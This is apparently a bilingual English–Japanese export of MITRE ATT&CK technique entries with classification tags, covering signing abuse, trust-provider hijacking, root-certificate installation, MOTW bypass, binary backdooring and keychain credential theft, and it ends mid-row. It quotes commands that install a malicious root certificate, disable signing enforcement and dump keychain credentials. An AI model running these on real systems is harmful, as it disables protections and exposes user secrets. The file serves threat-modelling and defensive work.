T1553.002,T1553,Code Signing,コード署名,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature. Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning) Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",攻撃者は、マルウェアやツールに署名するためにコード署名材料を作成、取得、または窃取する可能性があります。コード署名は、開発者によるバイナリの真正性を保証し、バイナリが改ざんされていないことを保証します。(引用元: Wikipedia コード署名) 操作中に使用される証明書は、攻撃者によって作成、取得、または窃取される可能性があります。 （出典：Securelist デジタル証明書）（出典：Symantec デジタル証明書）[無効なコード署名](https://attack.mitre.org/techniques/T1036/001)とは異なり、この活動は有効な署名を生成する。初回実行時のソフトウェア検証を目的としたコード署名は、現代のWindowsおよびmacOSシステムで利用可能である。 プラットフォームの分散型性質のため、Linuxでは使用されません。(引用: Wikipedia コード署名)(引用: EclecticLightChecksonEXECodeSigning) コード署名証明書は、署名付きコードの実行をシステム上で要求するセキュリティポリシーを回避するために使用される可能性があります。,defense-evasion,macOS;Windows,defense_disable,stealth,authentication_system;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082,2020-02-05T16:27:37.784Z,2025-04-16T20:37:16.240Z,,,,
T1553.003,T1553,SIP and Trust Provider Hijacking,SIP および信頼プロバイダのハイジャック,"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017) Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017) Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017) * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex). * **Note:** The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking. Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",攻撃者は、署名検証チェックを実行する際にオペレーティングシステムやアプリケーション制御ツールを欺くため、SIPおよび信頼プロバイダーコンポーネントを改ざんする可能性があります。ユーザーモードでは、Windows Authenticode（引用元: Microsoft Authenticode）デジタル署名を使用してファイルの起源と完全性を検証します。これらは署名付きコードへの信頼を確立するために使用される変数です（例: 有効なMicrosoft署名を持つドライバーは安全として扱われる可能性があります）。 署名検証プロセスはWinVerifyTrustアプリケーションプログラミングインターフェース（API）関数（引用元：Microsoft WinVerifyTrust）を介して処理され、問い合わせを受け付け、署名のパラメータ検証を担当する適切な信頼プロバイダーと連携します。 (引用: SpectorOps Subverting Trust 2017年9月) 実行可能ファイルの種類と対応する署名形式が多様であるため、MicrosoftはAPI関数とファイル間の抽象化レイヤーを提供する「Subject Interface Packages（SIPs）」（引用: EduardosBlog SIPs 2008年7月）と呼ばれるソフトウェアコンポーネントを作成しました。SIPsは、API関数が署名の作成、取得、計算、検証を可能にする役割を担います。 ほとんどのファイル形式（実行可能ファイル、PowerShell、インストーラーなど）には固有のSIPが存在し（カタログ署名が一括対応を提供（引用元：Microsoft Catalog Files and Signatures 2017年4月））、これらはグローバルに一意の識別子（GUID）で識別されます。 （引用元：SpectorOps Subverting Trust 2017年9月）[コード署名](https://attack.mitre.org/techniques/T1553/002)と同様に、攻撃者はこのアーキテクチャを悪用して信頼制御を破壊し、正当に署名されたコードのみをシステム上で実行を許可するセキュリティポリシーを迂回する可能性があります。 攻撃者はSIPおよび信頼プロバイダーコンポーネントを乗っ取り、悪意のある（または任意の）コードを以下の署名付きとして分類するようOSやアプリケーション制御ツールを欺く可能性があります：(引用元: SpectorOps Subverting Trust 2017年9月)* <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> を改変し、署名済みファイルからエンコードされたデジタル証明書を取得するSIPのCryptSIPDllGetSignedDataMsg関数を提供するダイナミックリンクライブラリ（DLL）を指すようにする。 悪意を持って作成されたDLLを指すように設定することで、攻撃者は実際のファイル署名ではなく、常に既知の有効な署名値（例：Microsoftのポータブル実行可能ファイル用署名）を返すエクスポート関数を悪用できます。これにより、攻撃者はそのSIPを使用する全ファイルに許容可能な署名値を適用することが可能となります （引用元: GitHub SIP POC 2017年9月）（ただし、関数が返すハッシュ値はファイルから計算された値と一致しないため、ハッシュ不一致が発生し署名が無効化される可能性が高い）。* <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> 内の<code>Dll</code>および<code>FuncName</code>レジストリ値を変更する。これらはSIPのCryptSIPDllVerifyIndirectData関数を提供するDLLを指しており、この関数はファイルの計算済みハッシュ値と署名付きハッシュ値を検証する。 悪意を持って作成されたDLL（常にTRUEを返すエクスポート関数を持つ）を指すように設定することで、攻撃者は正当な署名を持つ任意のファイルを、前述のCryptSIPDllGetSignedDataMsg関数の乗っ取りの有無にかかわらず、そのSIPを使用して正常に検証できます（出典: GitHub SIP POC 2017年9月）。 このレジストリ値は、既存のDLLから適切なエクスポート関数へリダイレクトすることも可能であり、ディスク上に新規ファイルをドロップ・実行する要件を回避できる。* <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{トラストプロバイダーGUID}</code>内の<code>DLL</code>および<code>Function</code>レジストリ値を変更する。これらはトラストプロバイダーのFinalPolicy関数を提供するDLLを指しており、ここで復号化・解析された署名が検証され、信頼判断の大部分が行われる。 SIPのCryptSIPDllVerifyIndirectData関数のハイジャックと同様に、この値は既存のDLLまたは悪意を持って作成されたDLLから適切なエクスポート関数へリダイレクト可能です（ただし信頼プロバイダーの実装は複雑です）。 * **注記:** 上記のハイジャックは、レジストリを変更せずに[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序のハイジャックによっても実現可能です。SIPや信頼プロバイダーコンポーネントをハイジャックすると、コード署名や署名検証を行うあらゆるアプリケーションからこれらの悪意あるコンポーネントが呼び出される可能性があるため、永続的なコード実行も可能になります。 (引用元: SpectorOps Subverting Trust 2017年9月),defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc,2020-02-05T19:34:04.910Z,2025-04-15T19:58:31.965Z,,,,
T1553.004,T1553,Install Root Certificate,ルート証明書のインストール,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental) Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish) Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017) In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",攻撃者は、侵害されたシステムにルート証明書をインストールし、攻撃者が制御するWebサーバーへの接続時に警告を回避することがあります。ルート証明書は公開鍵暗号において、ルート認証局（CA）を識別するために使用されます。 ルート証明書がインストールされると、システムまたはアプリケーションは、そのルート証明書によって署名されたルート証明書の信頼チェーン内の証明書を信頼するようになります。（引用元：Wikipedia Root Certificate）証明書は、ウェブブラウザ内で安全なTLS/SSL通信を確立するために一般的に使用されます。ユーザーが信頼されていない証明書を提示するウェブサイトを閲覧しようとすると、セキュリティリスクを警告するエラーメッセージが表示されます。 セキュリティ設定によっては、ブラウザが当該ウェブサイトへの接続を許可しない場合もあります。侵害されたシステムにルート証明書をインストールすると、攻撃者がそのシステムのセキュリティを低下させる手段を提供することになります。攻撃者はこの手法を利用し、侵害されたシステムがHTTPS経由で攻撃者が制御するWebサーバー（正規サイトを偽装してログイン認証情報を収集する）に接続する際、ユーザーに表示されるセキュリティ警告を回避してきました。(引用: Operation Emmental) 製造元やソフトウェア供給チェーンによってシステムにプリインストールされた非標準ルート証明書も存在し、マルウェア/アドウェアと組み合わせて[中間者攻撃](https://attack.mitre.org/techniques/T1557)を実現し、安全なTLS/SSL通信経由で送信される情報を傍受するために利用された。(引用: カスペルスキー・スーパーフィッシュ) ルート証明書（および関連する証明書チェーン）は複製・再インストールも可能である。複製された証明書チェーンは元の証明書と多くのメタデータ特性を共有し、悪意のあるコードの署名に使用される。これにより、実行を阻止したり永続化の痕跡を発見するために使用される署名検証ツール（例：Sysinternals、アンチウイルスなど）を迂回できる。(引用: SpectorOps Code Signing Dec 2017) macOSでは、Ay MaMiマルウェアが<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>を使用して、悪意のある証明書を信頼済みルート証明書としてシステムキーチェーンにインストールする。(引用元: objective-see ay mami 2018),defense-evasion,Linux;macOS;Windows,credential_abuse,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839,2020-02-21T21:05:32.844Z,2025-04-15T19:59:06.251Z,,,,
T1553.005,T1553,Mark-of-the-Web Bypass,Mark-of-the-Web バイパス,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020) Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",攻撃者は特定のファイル形式を悪用し、Mark-of-the-Web (MOTW) 制御を回避する可能性があります。 Windows では、インターネットからファイルがダウンロードされると、<code>Zone.Identifier</code> という名前の隠し NTFS 代替データストリーム (ADS) が付与され、MOTW として知られる特定の値が設定されます。(引用元: Microsoft Zone.Identifier 2020) MOTW が付与されたファイルは保護され、特定の操作を実行できません。 例えば、MS Office 10以降では、MOTWが付与されたMS Officeファイルは保護された表示で起動します。MOTWが付与された実行ファイルは、Windows Defender SmartScreenによって処理され、既知の実行ファイルの許可リストと照合されます。ファイルが既知/信頼されていない場合、SmartScreenは実行を阻止し、ユーザーに実行しないよう警告します。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)(引用: Intezer Russian APT Dec 2020)攻撃者は、圧縮/アーカイブファイル（.arj、.gzip）やディスクイメージファイル（.iso、.vhd）などのコンテナ形式を悪用し、MOTWタグが付与されていない悪意のあるペイロードを配信する可能性があります。 インターネットからダウンロードされたコンテナファイルはMOTWでマークされますが、コンテナファイルが抽出および/またはマウントされた後、内部のファイルはMOTWを継承しない場合があります。MOTWはNTFSの機能であり、多くのコンテナファイルはNTFS代替データストリームをサポートしていません。 コンテナファイルが抽出および/またはマウントされた後、それらに含まれるファイルはディスク上のローカルファイルとして扱われ、保護機能なしで実行される可能性があります。（引用元：Beek Use of VHD Dec 2020）（引用元：Outflank MotW 2020）,defense-evasion,Windows,discovery_enumeration,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961,2021-02-22T14:20:31.650Z,2025-04-15T19:58:45.702Z,,,,
T1553.006,T1553,Code Signing Policy Modification,コード署名ポリシーの改変,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP) Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014) To gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",攻撃者は、署名なしまたは自己署名コードの実行を可能にするため、コード署名ポリシーを変更する可能性があります。コード署名は、開発者によるプログラムの真正性を保証し、プログラムが改ざんされていないことを保証します。セキュリティ制御には、有効な署名付きコードのみがオペレーティングシステム上で実行されることを保証する強制メカニズムが含まれる場合があります。 これらのセキュリティ制御の一部は、Windows のドライバ署名強制 (DSE) や macOS のシステム整合性保護 (SIP) のように、デフォルトで有効化されている場合があります。(引用元: Microsoft DSE 2017年6月)(引用元: Apple Disable SIP) 他の制御はデフォルトで無効化されている場合がありますが、アプリケーション制御を通じて設定可能です。例えば、署名付きダイナミックリンクライブラリ (DLL) のみをシステム上で実行可能にするなどです。 開発者がアプリケーションの開発・テスト中にデフォルトの署名強制ポリシーを変更する必要が生じる可能性があるため、昇格された権限でこれらの機能を無効化できる場合があります。（引用元：Microsoft Unsigned Driver Apr 2017）(引用元: Apple Disable SIP) 攻撃者はコマンドラインやGUIユーティリティの使用、[レジストリ変更](https://attack.mitre.org/techniques/T1112)、デバッグ/リカバリモードでの再起動、カーネルメモリ内の変数値の改変など、様々な方法でコード署名ポリシーを変更する可能性がある。(引用元: Microsoft TESTSIGNING 2021年2月)(引用元: Apple SIP無効化)(引用元: FireEye HIKIT Rootkit Part 2)(引用元: GitHub Turla Driver Loader) システムのコード署名ポリシーを変更可能なコマンド例として、Windowsでは<code>bcdedit.exe -set TESTSIGNING ON</code>、macOSでは<code>csrutil disable</code>が挙げられる。(引用元: Microsoft TESTSIGNING Feb 2021)(引用元: Apple Disable SIP) 実装によっては、署名ポリシーの変更成功に侵害されたシステムの再起動が必要となる場合があります。さらに、一部の実装ではユーザーに可視的な痕跡（例: 画面隅に「テストモード中」と表示される透かし）が生じる可能性があります。攻撃者はこうした痕跡の除去を試みる場合があります。(引用元: F-Secure BlackEnergy 2014) 署名チェックに関連する変数（例: ドライバ署名強制を無効化する<code>g_CiOptions</code>の改変）を変更するためにカーネルメモリにアクセスするため、攻撃者は署名済みだが脆弱なドライバを用いた[権限昇格のためのエクスプロイト](https://attack.mitre.org/techniques/T1068)を実行する可能性がある。(引用元: Unit42 AcidBox June 2020)(引用元: GitHub Turla Driver Loader),defense-evasion,Windows;macOS,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c,2021-04-23T01:04:57.161Z,2025-04-15T19:58:33.055Z,,,,
T1554,,Compromise Host Software Binary,ホストソフトウェアバイナリの侵害,"Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications. Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024) An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021) After modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)",攻撃者は、システムへの永続的なアクセスを確立するためにホストソフトウェアバイナリを改変する可能性があります。ソフトウェアバイナリ/実行ファイルは、幅広いシステムコマンドやサービス、プログラム、ライブラリを提供します。一般的なソフトウェアバイナリには、SSHクライアント、FTPクライアント、メールクライアント、ウェブブラウザ、その他多くのユーザー向けまたはサーバー向けアプリケーションが含まれます。 攻撃者はホストソフトウェアバイナリへの改変を通じて永続性を確立する可能性がある。例えば、正当なアプリケーションバイナリ（またはサポートファイル）をバックドアで置き換える、あるいは感染させる。これらのバイナリはアプリケーションやユーザーによって日常的に実行されるため、攻撃者はこれを悪用してホストへの永続的アクセスを得られる。 攻撃者はまた、SSHクライアントなどのソフトウェアバイナリを改変し、ログイン時の認証情報を持続的に収集する場合があります（例：[認証プロセスの改変](https://attack.mitre.org/techniques/T1556)）。（引用元：Google Cloud Mandiant UNC3886 2024）攻撃者は、正当な実行前に悪意のある機能をパッチ適用（例：IATフッキング／エントリポイントパッチング）（引用元：Unit42 Banking Trojans Hooking 2022）することで既存バイナリを改変することもある。 例えば、攻撃者はバイナリのエントリポイントを改変し、通常の実行フローを再開する前に攻撃者がパッチを適用した悪意のあるコードを指すように設定することがあります。(引用: ESET FontOnLake Analysis 2021) バイナリ改変後、攻撃者は防御機能の無効化を試みる場合があります（例：yumパッケージマネージャーを使用するLinuxシステムにおける`yum-versionlock`コマンドや`versionlock.list`ファイルによる更新阻止）。（引用元：Google Cloud Mandiant UNC3886 2024）,persistence,Linux;macOS;Windows;ESXi,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5,2020-02-11T18:18:34.279Z,2025-04-15T19:58:52.206Z,,,,
T1555,,Credentials from Password Stores,パスワードストアからの認証情報,"Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",攻撃者は、ユーザー認証情報を取得するために一般的なパスワード保存場所を検索することがあります。(引用元: F-Secure The Dukes) パスワードは、認証情報を保持するオペレーティングシステムやアプリケーションに応じて、システム上の複数の場所に保存されます。また、パスワードマネージャーやクラウドシークレット保管庫など、ユーザーが管理や維持を容易にするためにパスワードを保存する特定のアプリケーションやサービスも存在します。認証情報が取得されると、それらは横方向の移動や制限付き情報へのアクセスに使用される可能性があります。,credential-access,Linux;macOS;Windows;IaaS,credential_abuse,credential_gain,authentication_system;user_interaction;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0,2020-02-11T18:48:28.456Z,2025-04-15T22:12:11.343Z,,,,
T1555.001,T1555,Keychain,キーチェーン,"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann) Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)","攻撃者はキーチェーンから認証情報を取得する可能性があります。キーチェーン（またはキーチェーンサービス）は、アカウント名、パスワード、秘密鍵、証明書、機密性の高いアプリケーションデータ、支払いデータ、セキュアノートを保存するmacOSの認証情報管理システムです。 キーチェーンには3種類あります：ログインキーチェーン、システムキーチェーン、ローカルアイテム（iCloud）キーチェーンです。デフォルトのキーチェーンはログインキーチェーンで、ユーザーのパスワードや情報を保存します。システムキーチェーンは、ホスト上のユーザー間で共有されるアイテムなど、オペレーティングシステムがアクセスするアイテムを保存します。ローカルアイテム（iCloud）キーチェーンは、AppleのiCloudサービスと同期されるアイテムに使用されます。 キーチェーンは「キーチェーンアクセス」アプリケーションまたはコマンドラインユーティリティ<code>security</code>で閲覧・編集可能です。キーチェーンファイルは<code>~/Library/Keychains/</code>、<code>/Library/Keychains/</code>、<code>/Network/Library/Keychains/</code>に配置されます。(引用元: Keychain Services Apple)(引用元: Keychain Decryption Passware)(引用元: OSX Keychain Schaumann) 攻撃者はキーチェーンのストレージ/メモリからユーザー認証情報を収集する可能性があります。例えば、コマンド<code>security dump-keychain –d</code>は<code>~/Library/Keychains/login.keychain-db</code>からログインキーチェーンの全認証情報をダンプします。 攻撃者は<code>~/Library/Keychains/login.keychain</code>ファイルから直接ログインキーチェーン認証情報を読み取ることも可能です。いずれの方法もパスワードを必要とし、ログインキーチェーンのデフォルトパスワードはmacOSホストへのログインに使用する現行ユーザーのパスワードです。(引用元: External to DA, the OS X Way)(引用元: Empire Keychain Decrypt)",credential-access,macOS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3,2020-02-12T18:55:24.728Z,2025-04-15T22:44:01.937Z,,,,
T1555.002,T1555,Securityd Memory,セキュリティdメモリ,"An adversary with root access may gather credentials by reading `securityd`’s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware) In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s `securityd` utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",ルート権限を持つ攻撃者は、`securityd`のメモリを読み取ることで認証情報を収集できる可能性があります。`securityd`は暗号化や認証などのセキュリティプロトコルを実装するサービス/デーモンです。(引用元: Apple Dev 